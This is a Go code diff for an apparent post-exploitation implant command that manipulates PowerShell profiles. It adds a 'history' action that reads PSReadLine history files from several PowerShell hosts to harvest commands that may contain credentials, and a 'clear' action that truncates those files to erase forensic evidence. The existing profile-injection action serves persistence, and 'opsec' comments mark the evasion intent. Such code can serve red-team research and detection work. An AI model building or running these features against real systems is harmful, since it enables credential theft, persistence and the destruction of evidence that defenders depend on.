@@ -16,7 +16,7 @@ type ShellConfigCommand struct{}
 
 func (c *ShellConfigCommand) Name() string { return "shell-config" }
 func (c *ShellConfigCommand) Description() string {
-	return "List/read/inject/remove PowerShell profile files for persistence (T1546.013)"
+	return "Read PS history, list/read/inject/remove/clear PowerShell profiles and history (T1546.013, T1552.003, T1070.003)"
 }
 
 type shellConfigArgs struct {
@@ -65,7 +65,7 @@ func getPSProfiles() []psProfile {
 
 func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Actions: list, read, inject, remove")
+		return errorResult("Error: parameters required. Actions: history, list, read, inject, remove, clear")
 	}
 
 	var args shellConfigArgs
@@ -81,6 +81,8 @@ func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	switch strings.ToLower(args.Action) {
+	case "history":
+		return psHistory(args)
 	case "list":
 		return psProfileList()
 	case "read":
@@ -89,8 +91,10 @@ func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
 		return psProfileInject(args)
 	case "remove":
 		return psProfileRemove(args)
+	case "clear":
+		return psClear(args)
 	default:
-		return errorf("Unknown action: %s\nAvailable: list, read, inject, remove", args.Action)
+		return errorf("Unknown action: %s\nAvailable: history, list, read, inject, remove, clear", args.Action)
 	}
 }
 
@@ -221,6 +225,131 @@ func psProfileRemove(args shellConfigArgs) structs.CommandResult {
 	}
 
 	return successf("Removed %d line(s) from %s", removed, path)
+}
+
+// getPSHistoryFiles returns paths to PowerShell command history files.
+// PSReadLine stores per-host history in %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\
+func getPSHistoryFiles() []string {
+	appData := os.Getenv("APPDATA")
+	if appData == "" {
+		home, _ := os.UserHomeDir()
+		appData = filepath.Join(home, "AppData", "Roaming")
+	}
+
+	psReadLineDir := filepath.Join(appData, "Microsoft", "Windows", "PowerShell", "PSReadLine")
+
+	// Known history file names for different PowerShell hosts
+	hostFiles := []string{
+		"ConsoleHost_history.txt",                   // PowerShell console (pwsh / powershell.exe)
+		"Visual Studio Code Host_history.txt",       // VS Code integrated terminal
+		"Windows PowerShell ISE Host_history.txt",   // ISE
+		"ServerRemoteHost_history.txt",              // PSRemoting / Enter-PSSession
+	}
+
+	var paths []string
+	for _, f := range hostFiles {
+		paths = append(paths, filepath.Join(psReadLineDir, f))
+	}
+	return paths
+}
+
+// psHistory reads PowerShell command history from PSReadLine history files.
+func psHistory(args shellConfigArgs) structs.CommandResult {
+	maxLines := args.Lines
+	if maxLines < 1 {
+		maxLines = 100
+	}
+
+	var sb strings.Builder
+	found := 0
+
+	for _, path := range getPSHistoryFiles() {
+		content, err := os.ReadFile(path)
+		if err != nil {
+			continue
+		}
+
+		lines := strings.Split(strings.TrimRight(string(content), "\r\n"), "\n")
+		structs.ZeroBytes(content) // opsec: clear history (may contain credentials in commands)
+		found++
+
+		sb.WriteString(fmt.Sprintf("=== %s (%d lines total) ===\n", path, len(lines)))
+
+		start := 0
+		if len(lines) > maxLines {
+			start = len(lines) - maxLines
+			sb.WriteString(fmt.Sprintf("(showing last %d lines)\n", maxLines))
+		}
+		for i := start; i < len(lines); i++ {
+			sb.WriteString(strings.TrimRight(lines[i], "\r") + "\n")
+		}
+		sb.WriteString("\n")
+	}
+
+	if found == 0 {
+		return successResult("No PowerShell history files found.")
+	}
+
+	return successResult(sb.String())
+}
+
+// psClear securely wipes PowerShell command history files for anti-forensics (T1070.003).
+// Reads the file, zeros the memory, then truncates to zero bytes.
+// If a specific file is given, only that file is cleared; otherwise all history files.
+func psClear(args shellConfigArgs) structs.CommandResult {
+	var targets []string
+	if args.File != "" {
+		path := args.File
+		if !filepath.IsAbs(path) {
+			// Try resolving as a profile path first
+			resolved := resolveProfilePath(path)
+			if resolved != "" {
+				path = resolved
+			}
+		}
+		targets = append(targets, path)
+	} else {
+		targets = getPSHistoryFiles()
+	}
+
+	var sb strings.Builder
+	sb.WriteString("=== PowerShell History Clear ===\n\n")
+	cleared := 0
+
+	for _, path := range targets {
+		info, err := os.Stat(path)
+		if err != nil {
+			continue // file doesn't exist
+		}
+
+		origSize := info.Size()
+		if origSize == 0 {
+			continue // already empty
+		}
+
+		content, err := os.ReadFile(path)
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("  [-] %s: read error: %v\n", path, err))
+			continue
+		}
+		structs.ZeroBytes(content) // opsec: zero history content in memory
+
+		if err := os.Truncate(path, 0); err != nil {
+			sb.WriteString(fmt.Sprintf("  [-] %s: truncate error: %v\n", path, err))
+			continue
+		}
+
+		sb.WriteString(fmt.Sprintf("  [+] %s: cleared (%d bytes)\n", path, origSize))
+		cleared++
+	}
+
+	if cleared == 0 {
+		sb.WriteString("  No history files found or all already empty.\n")
+	} else {
+		sb.WriteString(fmt.Sprintf("\n  %d file(s) cleared.\n", cleared))
+	}
+
+	return successResult(sb.String())
 }
 
 // resolveProfilePath resolves a profile name or path to an absolute path.
